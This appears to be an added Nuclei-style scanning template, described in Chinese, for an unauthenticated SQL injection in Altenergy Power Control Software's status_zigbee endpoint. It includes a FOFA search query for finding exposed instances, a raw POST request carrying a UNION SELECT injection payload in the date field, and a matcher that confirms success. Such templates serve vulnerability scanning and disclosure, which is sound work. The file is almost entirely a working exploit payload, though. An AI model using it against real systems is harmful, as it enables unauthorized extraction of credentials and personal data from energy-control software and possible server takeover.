@@ -1,0 +1,28 @@
+id: Altenergy-status_zigbee-SQL
+
+info:
+  name: Altenergy 电力系统控制软件 /index.php/display/status_zigbee SQL注入
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: title="Altenergy Power Control Software"
+    Altenergy 电力系统控制软件 /index.php/display/status_zigbee 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+  reference:
+    - 
+  tags: sql, altenergy, power-control-software
+
+http:
+  - raw:
+      - |-
+        POST /index.php/display/status_zigbee HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+
+        date=2024-11-06%' UNION ALL SELECT 11,CHAR(113)||CHAR(75,101,86,69,115,83,113,89,100,122,121,102,83,83,113,86,84,112,100,103,69,75,80,117,88,109,83,105,89,116,110,120,76,84,73,109,115,100,83,107)||CHAR(113,118,98,98,113),11-- wPIB
+
+    matchers:
+      - type: dsl
+        name: SQL注入
+        dsl:
+          - "status_code == 200 && contains_all(body, 'qKeVEsSqYdzyfSSqVTpdgEKPuXmSiYtnxLTImsdSkqvbbq')"
